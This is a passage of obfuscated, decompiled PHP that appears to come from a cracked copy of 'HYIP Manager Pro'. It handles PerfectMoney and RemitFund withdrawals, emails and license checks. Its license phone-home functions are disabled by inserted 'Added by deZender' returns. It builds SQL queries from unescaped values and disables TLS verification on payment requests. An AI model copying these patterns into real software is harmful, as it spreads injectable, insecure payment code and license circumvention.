        }

        while (!$elnlcwrJh)
        {
          $elnlcRySSd = trim (substr ($elnlcwPHwD, $elnlcDHpr + 7, $elnlcOvCK - 7));
          $elnlcwPHwD = trim (substr ($elnlcwPHwD, $elnlcOvCK + 8));
          $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = elnlcyokbw ($elnlcRySSd, 'text');
          $elnlcpSub[$elnlchyuw['elnlcjCrb']] = elnlcyokbw ($elnlcRySSd, 'additional');
          if ($elnlceQGF = stristr ($elnlcwPHwD, '<error>') === false)
          {
            $elnlcwrJh = true;
          }
          else
          {
            $elnlcDHpr = strlen ($elnlcwPHwD) - strlen ($elnlceQGF);
          }

          if ($elnlcUUwE = stristr ($elnlcwPHwD, '</error>') === false)
          {
            $elnlcwrJh = true;
            continue;
          }
          else
          {
            $elnlcOvCK = strlen ($elnlcwPHwD) - strlen ($elnlcUUwE);
            continue;
          }
        }

        $elnlcvzFRz = trim (substr ($elnlcvzFRz, $elnlczWUp + 16));
        if ($elnlcxrFBq = stristr ($elnlcvzFRz, '<errorresponse>') === false)
        {
          $elnlcslbp = true;
        }
        else
        {
          $elnlcQwwh = strlen ($elnlcvzFRz) - strlen ($elnlcxrFBq);
        }

        if ($elnlcuuaz = stristr ($elnlcvzFRz, '</errorresponse>') === false)
        {
          $elnlcslbp = true;
          continue;
        }
        else
        {
          $elnlczWUp = strlen ($elnlcvzFRz) - strlen ($elnlcuuaz);
          continue;
        }
      }
    }

    return $elnlcpSub;
  }

  function elnlcclmu ($elnlcxIcB, $elnlcpxLhS)
  {
    global $elnlchyuw;
    $elnlcbyqRl = strlen ($elnlcpxLhS) + 2;
    $elnlcgHATM = strpos ($elnlcxIcB, '' . '<' . $elnlcpxLhS . ' ');
    $elnlccbAGa = strpos ($elnlcxIcB, '' . '<' . $elnlcpxLhS . '>');
    if ($elnlcgHATM !== false)
    {
      $elnlcQwwh = $elnlcgHATM;
    }

    if ($elnlccbAGa !== false)
    {
      $elnlcQwwh = $elnlccbAGa;
    }

    if ($elnlcQwwh === false)
    {
      return '';
    }

    if ($elnlczWUp = strpos ($elnlcxIcB, '' . '</' . $elnlcpxLhS . '>') === false)
    {
      return '';
    }

    $elnlcxmfA = strpos ($elnlcxIcB, '>', $elnlcQwwh);
    $elnlcCrze = trim (substr ($elnlcxIcB, $elnlcxmfA + 1, $elnlczWUp - ($elnlcQwwh + $elnlcbyqRl)));
    return $elnlcCrze;
  }

  function elnlcnhxn ($elnlcxqTQI)
  {
    global $elnlchyuw;
    $elnlcpSub = array ();
    $elnlciUex = elnlcclmu ($elnlcxqTQI, 'Receipt');
    if ($elnlciUex != '')
    {
      $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlcsufSr'];
      $elnlcmjQyE = $elnlciUex;
      $elnlcpSub[$elnlchyuw['elnlcDPJw']] = elnlcclmu ($elnlcmjQyE, 'ReceiptId');
      $elnlcpSub[$elnlchyuw['elnlcQREDC']] = elnlcclmu ($elnlcmjQyE, 'Payer');
      $elnlcpSub[$elnlchyuw['elnlcVLQR']] = elnlcclmu ($elnlcmjQyE, 'Payee');
      $elnlcQCyE = elnlcclmu ($elnlcmjQyE, 'Equivalent');
      $elnlcpSub[$elnlchyuw['elnlcGsrCm']] = elnlcclmu ($elnlcQCyE, 'Amount');
      $elnlcpSub[$elnlchyuw['elnlczDWj']] = elnlcclmu ($elnlcQCyE, 'CurrencyId');
    }

    $elnlcvzFRz = elnlcclmu ($elnlcxqTQI, 'ErrorResponse');
    if ($elnlcvzFRz != '')
    {
      $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlcsKuVr'];
      $elnlcRySSd = $elnlcvzFRz;
      $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = elnlcclmu ($elnlcRySSd, 'Text');
      $elnlcpSub[$elnlchyuw['elnlcjCrb']] = elnlcclmu ($elnlcRySSd, 'Additional');
    }

    return $elnlcpSub;
  }

  function elnlcqfgi ($elnlcxqTQI)
  {
    global $elnlchyuw;
    $elnlcpSub = array ();
    $elnlciUex = elnlcclmu ($elnlcxqTQI, 'Receipt');
    if ($elnlciUex != '')
    {
      $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlcsufSr'];
      $elnlcmjQyE = $elnlciUex;
      $elnlcpSub[$elnlchyuw['elnlcDPJw']] = elnlcclmu ($elnlcmjQyE, 'ReceiptId');
      $elnlcpSub[$elnlchyuw['elnlcQREDC']] = elnlcclmu ($elnlcmjQyE, 'Payer');
      $elnlcpSub[$elnlchyuw['elnlcVLQR']] = elnlcclmu ($elnlcmjQyE, 'Payee');
      $elnlcpSub[$elnlchyuw['elnlcGsrCm']] = elnlcclmu ($elnlcmjQyE, 'Amount');
      $elnlcpSub[$elnlchyuw['elnlczDWj']] = elnlcclmu ($elnlcmjQyE, 'CurrencyId');
    }

    $elnlcvzFRz = elnlcclmu ($elnlcxqTQI, 'Balance');
    if ($elnlcvzFRz != '')
    {
      $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlcsufSr'];
      $elnlcRySSd = $elnlcvzFRz;
      $elnlcpSub[$elnlchyuw['elnlcCWBWj']] = elnlcclmu ($elnlcRySSd, 'Value');
    }

    $elnlcvzFRz = elnlcclmu ($elnlcxqTQI, 'Error');
    if ($elnlcvzFRz != '')
    {
      $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlcsKuVr'];
      $elnlcRySSd = $elnlcvzFRz;
      $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = elnlcclmu ($elnlcRySSd, 'Text');
      $elnlcpSub[$elnlchyuw['elnlcjCrb']] = elnlcclmu ($elnlcRySSd, 'Description');
    }

    return $elnlcpSub;
  }

  function elnlcvnzv ($elnlcxqTQI)
  {
    global $elnlchyuw;
    $elnlcpSub = array ();
    $elnlciUex = elnlcclmu ($elnlcxqTQI, 'Status');
    if (elnlcclmu ($elnlciUex, 'Code') == $elnlchyuw['elnlcKEqv'])
    {
      $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlcsufSr'];
    }
    else
    {
      $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = $elnlchyuw['elnlcsKuVr'];
      $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = elnlcclmu ($elnlcxqTQI, 'Message');
    }

    $elnlccBTQ = elnlcclmu ($elnlcxqTQI, 'Balance');
    if ($elnlccBTQ != '')
    {
      $elnlcpSub[$elnlchyuw['elnlcCWBWj']] = $elnlccBTQ;
    }

    $elnlciUex = elnlcclmu ($elnlcxqTQI, 'Transfer');
    if ($elnlciUex != '')
    {
      $elnlcpSub[$elnlchyuw['elnlcQREDC']] = elnlcclmu ($elnlciUex, 'Payer');
      $elnlcpSub[$elnlchyuw['elnlcVLQR']] = elnlcclmu ($elnlciUex, 'Payee');
      $elnlcpSub[$elnlchyuw['elnlcGsrCm']] = elnlcclmu ($elnlciUex, 'Amount');
      $elnlcpSub[$elnlchyuw['elnlcWlqC']] = elnlcclmu ($elnlciUex, 'Memo');
      $elnlcpSub[$elnlchyuw['elnlcDPJw']] = elnlcclmu ($elnlciUex, 'Batch');
      $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = elnlcclmu ($elnlciUex, 'Message');
    }

    return $elnlcpSub;
  }

  function elnlcwbed ($elnlcFFkqn, $elnlcLiht, $elnlcqdjux, $elnlcTBVVi, $elnlcuduiM)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($elnlcTcyic[$elnlchyuw['elnlcLdvMV']] == $elnlchyuw['elnlcoaeFK'])
    {
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcFPiR']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcqdjux == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to PerfectMoney account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid PerfectMoney account', '');
    }

    list ($elnlcojkk, $elnlcDrimo) = elnlcfeahv ($elnlcqdjux, 18);
    if ($elnlcojkk == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcDrimo . '\'';
      mysql_query ($q);
      return array (0, $elnlcDrimo);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcFFkqn == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'perfectmoney_password\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlcsRxM = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }
      }
      else
      {
        list ($elnlcsRxM, $elnlcrqAs) = preg_split ('/\\|/', $elnlcFFkqn);
        $elnlcTcyic[$elnlchyuw['elnlcKxWRu']] = $elnlcrqAs;
      }

      $elnlcBPWUh = curl_init ();
      $elnlcTBVVi = rawurlencode ($elnlcTBVVi);
      curl_setopt ($elnlcBPWUh, CURLOPT_URL, 'https://www.perfectmoney.com/acct/confirm.asp');
      curl_setopt ($elnlcBPWUh, CURLOPT_POST, 1);
      curl_setopt ($elnlcBPWUh, CURLOPT_POSTFIELDS, 'AccountID=' . rawurlencode ($elnlcTcyic[$elnlchyuw['elnlcpChHP']]) . '&PassPhrase=' . rawurlencode ($elnlcsRxM) . '&Payer_Account=' . rawurlencode ($elnlcTcyic[$elnlchyuw['elnlcKxWRu']]) . '&Payee_Account=' . rawurlencode ($elnlcqdjux) . '&Amount=' . rawurlencode ($elnlcLiht) . ('' . '&Memo=' . $elnlcTBVVi));
      curl_setopt ($elnlcBPWUh, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcBPWUh);
      curl_close ($elnlcBPWUh);
      $elnlcLDgi = array ();
      if (preg_match ('/<input name=\'PAYMENT_BATCH_NUM\' type=\'hidden\' value=\'(\\d+)\'>/ims', $a, $elnlcLDgi))
      {
        return array (1, '', $elnlcLDgi[1]);
      }
      else
      {
        if (preg_match ('/<input name=\'ERROR\' type=\'hidden\' value=\\\'(.*?)\\\'>/ims', $a, $elnlcLDgi))
        {
          $elnlctjzLV = preg_replace ('/&lt;/i', '<', $elnlcLDgi[1]);
          $elnlctjzLV = preg_replace ('/&gt;/i', '>', $elnlctjzLV);
          $e = elnlcekjci ('' . $elnlcuduiM . ' ' . $elnlctjzLV);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcuduiM . ('' . ' ' . $elnlctjzLV), '');
        }
        else
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcuduiM . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcekjci ('' . $elnlcuduiM . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcuduiM . ' Curl functions are not available');
    }

  }

  function elnlcfubsc ($elnlcFFkqn, $elnlcLiht, $elnlcqdjux, $elnlcTBVVi, $elnlcuduiM)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($elnlcTcyic[$elnlchyuw['elnlcLdvMV']] == $elnlchyuw['elnlcoaeFK'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcFPiR']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcqdjux == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty RemitFund account.\'';
      mysql_query ($q);
      return array (0, 'Invalid RemintFund account', '');
    }

    list ($elnlcojkk, $elnlcDrimo) = elnlcfeahv ($elnlcqdjux, 25);
    if ($elnlcojkk == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcDrimo . '\'';
      mysql_query ($q);
      return array (0, $elnlcDrimo);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcFFkqn == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'remitfund_password\'';
        $elnlcTpvVW = mysql_query ($q);
        while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
        {
          $elnlclHpD = elnlcaqvpp ($elnlcgVDB[$elnlchyuw['elnlcrWusB']], $elnlchyuw['elnlcpslqd']);
        }

        $elnlcdlMII = $elnlcTcyic[$elnlchyuw['elnlcuAWK']];
      }
      else
      {
        list ($elnlclHpD, $elnlcdlMII) = preg_split ('/\\|/', $elnlcFFkqn);
      }

      $elnlcBPWUh = curl_init ();
      $elnlcPJTW = strtoupper (md5 ('' . $elnlcdlMII . 'transferUSD' . $elnlcTcyic[$elnlchyuw['elnlcQmOx']] . $elnlcqdjux . $elnlcLiht . strtoupper (md5 ($elnlclHpD))));
      $elnlcxIcB = '<TransferRequest>
  <Auth>
    <ApiName>' . htmlspecialchars ($elnlcdlMII) . ('' . '</ApiName>
    <Token>' . $elnlcPJTW . '</Token>
  </Auth>
  <Transfer>
    <TransferId></TransferId>
    <TransferType>transfer</TransferType>
    <Payer>') . htmlentities ($elnlcTcyic[$elnlchyuw['elnlcQmOx']], ENT_NOQUOTES) . '</Payer>
    <Payee>' . htmlentities ($elnlcqdjux, ENT_NOQUOTES) . '</Payee>
    <CurrencyId>USD</CurrencyId>
    <Amount>' . htmlentities ($elnlcLiht, ENT_NOQUOTES) . '</Amount>
    <Memo>' . htmlentities ($elnlcTBVVi, ENT_NOQUOTES) . '</Memo>
  </Transfer>
</TransferRequest>';
      $elnlcBPWUh = curl_init ();
      curl_setopt ($elnlcBPWUh, CURLOPT_URL, 'https://www.remitfund.com/xml/api.php?req=' . urlencode ($elnlcxIcB));
      curl_setopt ($elnlcBPWUh, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
      $elnlcNNiM = array ('User-Agent: Mozilla/5.0');
      curl_setopt ($elnlcBPWUh, CURLOPT_HTTPHEADER, $elnlcNNiM);
      $a = curl_exec ($elnlcBPWUh);
      curl_close ($elnlcBPWUh);
      $elnlcpSub = elnlcciru ($a);
      if ($elnlcpSub[$elnlchyuw['elnlcMnIrp']] == $elnlchyuw['elnlcuQOep'])
      {
        return array (1, '', $elnlcpSub[$elnlchyuw['elnlcDPJw']]);
      }
      else
      {
        if ($elnlcpSub[$elnlchyuw['elnlcMnIrp']] == $elnlchyuw['elnlcbULGC'])
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' ' . $elnlcpSub[$elnlchyuw['elnlcSbHgw']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcekjci ('' . $elnlcuduiM . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcekjci ('' . $elnlcuduiM . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcuduiM . ' Curl functions are not available');
    }

  }

  function elnlcciru ($elnlcxqTQI)
  {
    global $elnlchyuw;
    $elnlcpSub = array ();
    $elnlciUex = elnlcclmu ($elnlcxqTQI, 'Response');
    if ($elnlciUex != '')
    {
      $elnlcmjQyE = $elnlciUex;
      $elnlcpSub[$elnlchyuw['elnlcwhrn']] = elnlcclmu ($elnlcmjQyE, 'Code');
      $elnlcpSub[$elnlchyuw['elnlcSbHgw']] = elnlcclmu ($elnlcmjQyE, 'Message');
      $elnlcpSub[$elnlchyuw['elnlcMnIrp']] = ($elnlcpSub[$elnlchyuw['elnlcwhrn']] == 0 ? 'ok' : 'error');
      $elnlcpSub[$elnlchyuw['elnlcDPJw']] = elnlcclmu ($elnlcmjQyE, 'TransferId');
      $elnlcpSub[$elnlchyuw['elnlcQREDC']] = elnlcclmu ($elnlcmjQyE, 'Payer');
      $elnlcpSub[$elnlchyuw['elnlcVLQR']] = elnlcclmu ($elnlcmjQyE, 'Payee');
      $elnlcpSub[$elnlchyuw['elnlcGsrCm']] = elnlcclmu ($elnlcmjQyE, 'Amount');
      $elnlcpSub[$elnlchyuw['elnlczDWj']] = elnlcclmu ($elnlcmjQyE, 'Currency');
    }

    return $elnlcpSub;
  }

  function elnlcqouq ($elnlcPCjz, $a)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcfyhb ($elnlcPCjz);
    }

    $elnlcvsVq = base64_encode ($elnlcPCjz);
    $a = preg_split ('//', $elnlcvsVq);
    $b = preg_split ('//', md5 ($elnlcPCjz) . base64_encode ($elnlcPCjz));
    $elnlcvsVq = '';
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < sizeof ($a); ++$i)
    {
      if (strlen ($a[$i]) == 0)
      {
        continue;
      }

      $elnlcvsVq = $elnlcvsVq . $a[$i] . $b[$i];
    }

    $elnlcvsVq = str_replace ('=', '!!!^', $elnlcvsVq);
    return elnlcsisf ($elnlcvsVq, $elnlcTcyic[$elnlchyuw['elnlcHPIo']], $elnlchyuw['elnlcpslqd']);
  }

  function elnlcaqvpp ($elnlcPCjz, $a)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcfyhb ($elnlcPCjz);
    }

    $elnlcPCjz = str_replace ('!!!^', '=', elnlcwman ($elnlcPCjz, $elnlcTcyic[$elnlchyuw['elnlcHPIo']], 'hyip manager pro 2005 jul 27'));
    $a = preg_split ('//', $elnlcPCjz);
    $elnlcPCjz = '';
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < sizeof ($a); $i += 2)
    {
      $elnlcPCjz .= $a[$i - 1];
    }

    $elnlcvsVq = base64_decode ($elnlcPCjz);
    return $elnlcvsVq;
  }

  function elnlcfyhb ($elnlcPCjz)
  {
    global $elnlchyuw;
    $elnlcvsVq = base64_encode ($elnlcPCjz);
    $a = preg_split ('//', $elnlcvsVq);
    $b = preg_split ('//', md5 ($elnlcPCjz) . base64_encode ($elnlcPCjz));
    $elnlcvsVq = '';
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < sizeof ($a); ++$i)
    {
      $elnlcvsVq = $elnlcvsVq . $a[$i] . $b[$i];
    }

    $elnlcvsVq = str_replace ('=', '!!!^', $elnlcvsVq);
    return $elnlcvsVq;
  }

  function elnlcjvfv ($elnlcPCjz)
  {
    global $elnlchyuw;
    $elnlcPCjz = str_replace ('!!!^', '=', $elnlcPCjz);
    $a = preg_split ('//', $elnlcPCjz);
    $elnlcPCjz = '';
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < sizeof ($a); $i += 2)
    {
      $elnlcPCjz .= $a[$i - 1];
    }

    $elnlcvsVq = base64_decode ($elnlcPCjz);
    return $elnlcvsVq;
  }

  function elnlcjzof ()
  {
    global $elnlchyuw;
    global $elnlcVWtlw;
    global $elnlcTcyic;
return;	// Added by deZender, 2010.01.30
    $elnlckqlN = ($elnlcTcyic[$elnlchyuw['elnlcLcBH']] == 1 ? '64.27.18.142' : $elnlchyuw['elnlcUuPHk']);
    $elnlcRsPFj = @fopen ($elnlchyuw['elnlcKRjz'] . $elnlckqlN . '/check.cgi?domain=' . $elnlcVWtlw[$elnlchyuw['elnlcvzsxj']] . '&license=' . $elnlcTcyic[$elnlchyuw['elnlcklHl']] . '&zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz', 'r');
    if ($elnlcRsPFj)
    {
      fclose ($elnlcRsPFj);
    }

  }

  function elnlcmisw ()
  {
    global $elnlchyuw;
    global $elnlcVWtlw;
    global $elnlcTcyic;
return;	// Added by deZender, 2010.01.30
    $l = '';
    if (function_exists ('curl_init'))
    {
      $i = $elnlchyuw['elnlcRjwtU'];
      while ($i < 2)
      {
        $elnlcBPWUh = curl_init ();
        if ($i == 1)
        {
          $elnlckqlN = '64.27.18.142';
        }
        else
        {
          $elnlckqlN = 'www.dnsargentina.com.ar';
        }

        $elnlcJThi = 'http://' . $elnlckqlN . '/check.cgi?install=1&script=3&domain=' . $elnlcVWtlw[$elnlchyuw['elnlcvzsxj']] . '&license=' . $elnlcTcyic[$elnlchyuw['elnlcklHl']] . '&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc';
        curl_setopt ($elnlcBPWUh, CURLOPT_URL, $elnlcJThi);
        curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
        $l = curl_exec ($elnlcBPWUh);
        curl_close ($elnlcBPWUh);
        if ($l != '')
        {
          $i = $elnlchyuw['elnlcIkxh'];
        }

        ++$i;
      }
    }

    if ($l == '')
    {
      $elnlcRsPFj = @fopen ($elnlchyuw['elnlcqiFC'] . $elnlcVWtlw[$elnlchyuw['elnlcvzsxj']] . '&license=' . $elnlcTcyic[$elnlchyuw['elnlcklHl']] . '&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc', 'r');
      if ($elnlcRsPFj)
      {
        $l = fread ($elnlcRsPFj, 200000);
        fclose ($elnlcRsPFj);
      }
    }

    return $l;
  }

  function elnlckjik ()
  {
    global $elnlchyuw;
  }

  function elnlciixa ($elnlcbrWGr)
  {
    global $elnlchyuw;
    global $elnlcVWtlw;
    global $elnlcTcyic;
return;	// Added by deZender, 2010.01.30
    $elnlckvRWp = base64_encode ($elnlcbrWGr);
    $elnlcBPWUh = curl_init ();
    $elnlcTBVVi = rawurlencode ($elnlcTBVVi);
    if ($elnlcTcyic[$elnlchyuw['elnlcLcBH']] == 1)
    {
      $elnlckqlN = '64.27.18.142';
    }
    else
    {
      if ($elnlcTcyic[$elnlchyuw['elnlcLcBH']] == 2)
      {
        $elnlckqlN = 'www.goldcodersmail.com';
      }
      else
      {
        $elnlckqlN = 'www.dnsargentina.com.ar';
      }
    }

    curl_setopt ($elnlcBPWUh, CURLOPT_URL, 'http://' . $elnlckqlN . $elnlchyuw['elnlcapWLN']);
    curl_setopt ($elnlcBPWUh, CURLOPT_POST, 1);
    curl_setopt ($elnlcBPWUh, CURLOPT_POSTFIELDS, '' . 'in=' . $elnlckvRWp . '&domain=' . $elnlcVWtlw[$elnlchyuw['elnlcvzsxj']] . '&s=p&license=' . $elnlcTcyic[$elnlchyuw['elnlcklHl']]);
    curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
    $l = curl_exec ($elnlcBPWUh);
    curl_close ($elnlcBPWUh);
    return chop ($l);
  }

  function elnlcveiuh ($elnlcbrWGr, $elnlcQusNQ = 0)
  {
    global $elnlchyuw;
    global $elnlcVWtlw;
    global $elnlcTcyic;
return;	// Added by deZender, 2010.01.30
    if ($elnlcQusNQ == 1)
    {
      $elnlckvRWp = substr (trim ($elnlcbrWGr), 0, 32);
    }
    else
    {
      $elnlckvRWp = base64_encode (serialize ($elnlcbrWGr));
    }

    $elnlcBPWUh = curl_init ();
    $elnlcTBVVi = rawurlencode ($elnlcTBVVi);
    if ($elnlcTcyic[$elnlchyuw['elnlcLcBH']] == 1)
    {
      $elnlckqlN = '64.27.18.142';
    }
    else
    {
      if ($elnlcTcyic[$elnlchyuw['elnlcLcBH']] == 2)
      {
        $elnlckqlN = 'www.goldcodersmail.com';
      }
      else
      {
        $elnlckqlN = 'www.dnsargentina.com.ar';
      }
    }

    curl_setopt ($elnlcBPWUh, CURLOPT_URL, 'http://' . $elnlckqlN . $elnlchyuw['elnlcQOmBO']);
    curl_setopt ($elnlcBPWUh, CURLOPT_POST, 1);
    curl_setopt ($elnlcBPWUh, CURLOPT_POSTFIELDS, '' . 'in=' . $elnlckvRWp . '&mode=' . $elnlcQusNQ . '&domain=' . $elnlcVWtlw[$elnlchyuw['elnlcvzsxj']] . '&s=p&license=' . $elnlcTcyic[$elnlchyuw['elnlcklHl']]);
    curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
    $l = curl_exec ($elnlcBPWUh);
    curl_close ($elnlcBPWUh);
    if ($elnlcQusNQ == 1)
    {
      $elnlcpSub = array ();
      if ($l != 'nill')
      {
        $elnlcpSub = unserialize (base64_decode (chop ($l)));
        if (!is_array ($elnlcpSub))
        {
          $elnlcpSub = array ();
        }
      }

      return $elnlcpSub;
    }
    else
    {
      return chop ($l);
    }

  }

  function elnlcqkpc ($elnlcgniN, $elnlcEdgs, $elnlcosLQe, $elnlcfOud)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    $q = '' . 'select * from hm2_emails where id = \'' . $elnlcgniN . '\'';
    $elnlcTpvVW = mysql_query ($q);
    $elnlcgVDB = mysql_fetch_array ($elnlcTpvVW);
    if (!$elnlcgVDB)
    {
      return null;
    }

    if (!$elnlcgVDB[$elnlchyuw['elnlcMnIrp']])
    {
      return null;
    }

    $elnlcrEgH = $elnlcgVDB[$elnlchyuw['elnlcSbHgw']];
    $elnlcKuIln = $elnlcgVDB[$elnlchyuw['elnlcmdFmL']];
    $elnlcjcEJ = $elnlcgVDB[$elnlchyuw['elnlcrgRLe']];
    foreach ($elnlcfOud as $k => $v)
    {
      if (is_array ($v))
      {
        $v = $v[0];
      }

      $elnlcrEgH = preg_replace ('' . '/#' . $k . '#/', $v, $elnlcrEgH);
      $elnlcjcEJ = preg_replace ('' . '/#' . $k . '#/', $v, $elnlcjcEJ);
      if ($elnlcgVDB[$elnlchyuw['elnlcLTak']])
      {
        $elnlcKuIln = preg_replace ('' . '/#' . $k . '#/', $v, $elnlcKuIln);
        continue;
      }
    }

    $elnlcrEgH = preg_replace ('/#site_name#/', $elnlcTcyic[$elnlchyuw['elnlcLdvMV']], $elnlcrEgH);
    if ($elnlcgVDB[$elnlchyuw['elnlcLTak']])
    {
      $elnlcKuIln = preg_replace ('/#site_name#/', $elnlcTcyic[$elnlchyuw['elnlcLdvMV']], $elnlcKuIln);
    }

    $elnlcjcEJ = preg_replace ('/#site_name#/', $elnlcTcyic[$elnlchyuw['elnlcLdvMV']], $elnlcjcEJ);
    $elnlcrEgH = preg_replace ('/#site_url#/', $elnlcTcyic[$elnlchyuw['elnlcCLGzU']], $elnlcrEgH);
    if ($elnlcgVDB[$elnlchyuw['elnlcLTak']])
    {
      $elnlcKuIln = preg_replace ('/#site_url#/', $elnlcTcyic[$elnlchyuw['elnlcCLGzU']], $elnlcKuIln);
    }

    $elnlcjcEJ = preg_replace ('/#site_url#/', $elnlcTcyic[$elnlchyuw['elnlcCLGzU']], $elnlcjcEJ);
    if ($elnlcgVDB[$elnlchyuw['elnlcLTak']])
    {
      $elnlcMuhWb = elnlcvnopv (12);
      $elnlcrEgH = elnlckuiqf ($elnlcrEgH);
      $elnlcKuIln = elnlcuejit ($elnlcKuIln);
      $elnlcOqmIG = '' . '--' . $elnlcMuhWb . '
Content-Type: text/plain;
Content-Transfer-Encoding: 8bit

' . $elnlcrEgH . '

--' . $elnlcMuhWb . '
Content-Type: text/html;
Content-transfer-encoding: quoted-printable;

' . $elnlcKuIln . '

--' . $elnlcMuhWb . '--';
    }
    else
    {
      $elnlcOqmIG = $elnlcrEgH;
    }

    if ($elnlcTcyic[$elnlchyuw['elnlcLdvMV']] == $elnlchyuw['elnlcoaeFK'])
    {
      $elnlcNrVL = fopen ($elnlchyuw['elnlcezzi'], $elnlchyuw['elnlcGEkD']);
      fwrite ($elnlcNrVL, '' . 'TO: ' . $elnlcEdgs . '
From: ' . $elnlcosLQe . '
Subject: ' . $elnlcjcEJ . '

' . $elnlcrEgH . '

');
      fclose ($elnlcNrVL);
    }
    else
    {
      mail ($elnlcEdgs, $elnlcjcEJ, $elnlcOqmIG, '' . 'From: ' . $elnlcosLQe . '
Reply-To: ' . $elnlcosLQe . ($elnlcgVDB[$elnlchyuw['elnlcLTak']] ? '' . '
Content-Type: multipart/alternative; boundary=' . $elnlcMuhWb : ''));
    }

  }

  function elnlcocdo ($elnlckvRWp)
  {
    global $elnlchyuw;
    $elnlckvRWp = str_replace ('
', '
', $elnlckvRWp);
    $elnlckvRWp = str_replace ('
', '
', $elnlckvRWp);
    return $elnlckvRWp;
  }

  function elnlckuiqf ($elnlckvRWp)
  {
    global $elnlchyuw;
    $elnlcMdano = elnlcocdo ($elnlckvRWp);
    if (substr ($elnlcMdano, 0 - strlen ('
')) != '
')
    {
      $elnlcMdano .= '
';
    }

    return $elnlcMdano;
  }

  function elnlcuejit ($elnlckvRWp)
  {
    global $elnlchyuw;
    $elnlcMdano = elnlcocdo ($elnlckvRWp);
    if (substr ($elnlcMdano, 0 - strlen ('
')) != '
')
    {
      $elnlcMdano .= '
';
    }

